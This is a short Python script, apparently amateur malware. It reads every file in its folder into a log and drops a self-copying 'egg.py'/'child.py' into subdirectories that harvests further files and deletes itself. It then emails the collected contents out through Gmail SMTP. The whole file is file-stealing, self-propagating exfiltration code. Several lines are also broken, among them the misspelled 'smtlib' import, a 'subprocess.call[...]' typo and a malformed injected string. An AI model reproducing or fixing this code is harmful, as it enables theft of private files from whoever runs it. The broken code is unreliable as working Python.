import smtlib as smtp
import os
import logging
import subprocess
import sys
import time
from shutil import copyfile

class core:
    def __init__(self):
        self.config = smtp.SMTP("smtp.gmail.com")
        self.config.starttls()
        self.config.login("", "")
        subprocess.call(["touch", "main.txt"])
        logging.basicConfig(filename=f"{os.path.dirname(__file__)}/main.txt", level=logging.DEBUG, format="%(message)s")
        self.core_dir = f"{os.path.dirname(__file__)}/main.txt"

    def start(self):
        for file in os.listdir(os.path.dirname(__file__)):
            if file == sys.argv[0]:
                pass
            else:
                try:
                    data = open(file, "r").read()
                    logging.info(f"file {file}\n\n{data}")
                except Exception as e:
                    subprocess.call["touch", f"{os.path.dirname(__file__)}/{file}/egg.py"]
                    open(f"{os.path.dirname(__file__)}/{file}/egg.py", "w").write("import subprocess\nimport logging\nimport os\nfrom shutil import copyfile\nlogging.basicConfig(filename=" + self.core_dir + ", level=logging.DEBUG, format='%(message)s')\nfor file in os.listdir(os.path.dirname(__file__)):\n    try:\n        data = open(f'{file}', 'r').read()\n        logging.info(f'file {file}\n\n{data}')\n    except Exception as e:\n        copyfile(f'{__file__}', f'{os.path.dirname(__file__)}/{file}/child.py')\n         subprocess.call(['python3', f'{os.path.dirname(__file__)}/{file}/child.py\nos.remove(__file__)'])")
                    subprocess.call(["python3", f"{os.path.dirname(__file__)}/{file}/egg.py"])
        self.config.sendmail("", "", f"""\n\n
        From: .
        Subject: .\n{open(self.core_dir, "r").readlines()}""")
        self.config.quit()





